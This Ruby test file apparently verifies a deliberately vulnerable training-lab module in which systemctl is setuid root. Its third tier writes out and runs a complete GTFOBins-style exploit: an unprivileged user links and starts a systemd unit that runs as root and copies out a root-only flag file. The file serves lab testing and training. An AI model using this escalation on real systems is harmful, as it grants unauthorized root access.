require_relative '../../../../../lib/post_provision_test'


class SuidRootSystemctlTest < PostProvisionTest
  def initialize
    self.module_name = 'suid_root_systemctl'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    leaked  = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      # the real binary (not a symlink) is root-owned and setuid 4755
      test_local_command('systemctl is setuid 4755 owned by root',
                         'stat -c "%a %U" "$(readlink -f /usr/bin/systemctl)"', '4755 root')
      test_local_command('/bin/systemctl and /usr/bin/systemctl are the same setuid file',
                         'stat -L -c "%a %U" /bin/systemctl /usr/bin/systemctl', '4755 root')

      # leaked flag files (leaked_filenames) are root-only in /root
      leaked.each do |f|
        test_local_command("#{f} root-only in /root",
                           "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      user = 'nobody'
      # a student finds it the usual way: listing setuid binaries
      test_local_command('unprivileged user finds setuid systemctl',
                         'find /usr/bin /usr/sbin -perm -4000 -name systemctl 2>/dev/null', 'systemctl', user: user)
      test_command_succeeds('systemctl runs as an unprivileged user', 'systemctl --version', user: user)

      # control: the flag really is unreadable to that user, so tier 3's read means something
      leaked.each do |f|
        test_local_command("control: unprivileged user cannot read #{f}",
                           "cat #{Shellwords.escape("/root/#{f}")} 2>&1", 'Permission denied', user: user)
      end
      # strings_to_leak is checked as file content (as root) so a flag in the file is the
      # one the student must reach.
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        test_local_command("leaked #{fname} holds the flag string",
                           "cat #{Shellwords.escape("/root/#{fname}")}", s.strip.lines.first.to_s.strip)
      end
    end

    # Tier 3: an unprivileged user escalates via the GTFOBins systemctl SUID
    # technique and reads the root-only flag. systemctl is setuid root, so when
    # a normal user runs it its euid is 0; systemd authorises the caller by the
    # connection's effective uid, so it accepts a privileged `link` + `start` and
    # runs the unit's ExecStart as root. The unit records `id` (proving uid=0,
    # the module's <privilege>=root_rwx) and copies the root-only flag out.
    tier(3) do
      flag     = leaked.first
      expected = strings.first.to_s.strip.lines.first.to_s.strip
      if flag.nil? || expected.empty?
        skip_check('systemctl SUID privesc reads the root-only flag',
                   'no leaked flag file / string on this target to prove the read', tier: 3)
      else
        root_flag = Shellwords.escape("/root/#{flag}")
        unit_name = 'secgen_t3_systemctl'
        out       = "/tmp/#{unit_name}.out"
        name      = 'systemctl SUID privesc runs as root and reads the root-only flag'

        with_throwaway_ssh_user do |user, _pass|
          # GTFOBins: systemctl (SUID). As the unprivileged user, write a unit
          # whose ExecStart runs our payload, link it (absolute path, outside the
          # search dirs), then start it. printf avoids any nested-heredoc quoting.
          exploit = <<~SH
            unit=/tmp/#{unit_name}.service
            payload=/tmp/#{unit_name}.sh
            out=#{out}
            sc=$(command -v systemctl || echo /usr/bin/systemctl)
            rm -f "$out"
            printf '%s\\n' '#!/bin/sh' "id > $out" "cat #{root_flag} >> $out 2>&1" "chmod 644 $out" > "$payload"
            printf '%s\\n' '[Unit]' 'Description=secgen t3 systemctl SUID' '[Service]' 'Type=oneshot' "ExecStart=/bin/sh $payload" > "$unit"
            "$sc" link "$unit" 2>&1
            "$sc" start #{unit_name}.service 2>&1
          SH
          run_as_user(user, exploit)

          body = run_command("cat #{out} 2>/dev/null")[:stdout].to_s
          add_evidence('systemctl_t3_output', "echo #{Shellwords.escape(body)}")

          # Tidy up: the issue requires the linked unit to be removed again.
          run_command("systemctl disable --now #{unit_name}.service 2>/dev/null; " \
                      "systemctl stop #{unit_name}.service 2>/dev/null; " \
                      "rm -f /etc/systemd/system/#{unit_name}.service " \
                      "/tmp/#{unit_name}.service /tmp/#{unit_name}.sh #{out}; " \
                      "systemctl daemon-reload 2>/dev/null")

          if body =~ /uid=0\(root\)/ && body.include?(expected)
            pass_check(name,
                       "throwaway user #{user} linked and started a systemd unit via setuid systemctl; " \
                       "ExecStart ran as #{body[/uid=\S+/]} and read /root/#{flag}: #{expected.inspect} — " \
                       '<privilege>=root_rwx verified',
                       tier: 3)
          elsif body =~ /uid=0\(root\)/
            fail_check(name,
                       "the unit ran as root (#{body[/uid=\S+/]}) but the flag string was not recovered " \
                       "from /root/#{flag}. See systemctl_t3_output evidence.",
                       tier: 3)
          else
            fail_check(name,
                       'setuid systemctl did not run the unit as root (no uid=0 in the output); ' \
                       'escalation did not occur. See systemctl_t3_output evidence.',
                       tier: 3)
          end
        end
      end
    end
  end

end

SuidRootSystemctlTest.new.run
